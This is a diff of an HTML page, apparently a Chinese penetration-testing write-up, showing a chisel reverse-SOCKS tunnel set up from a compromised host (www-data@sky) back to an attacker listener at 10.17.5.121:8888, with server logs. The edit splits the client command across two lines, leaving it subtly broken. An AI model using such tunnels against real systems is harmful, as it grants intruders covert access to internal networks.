@@ -232,7 +232,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 8888 --reverse</span><br><span class="line"></span><br><span class="line">2024/11/16 21:28:51 server: Reverse tunnelling enabled</span><br><span class="line">2024/11/16 21:28:51 server: Fingerprint CPyZ11V0OUg5OOq3hTjFuiTChTaWgj0fUQFRwWyvdTU=</span><br><span class="line">2024/11/16 21:28:51 server: Listening on http://0.0.0.0:8888</span><br><span class="line">2024/11/16 21:30:07 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)</span><br><span class="line">2024/11/16 21:30:07 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>目标机器启动客户端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@sky:/tmp$ ./chisel client 10.17.5.121:8888 R:socks</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@sky:/tmp$ ./chisel client 10.17.5.121:8888 R:</span><br><span class="line">socks</span><br></pre></td></tr></table></figure>
 
 
 <p>大致流程</p>
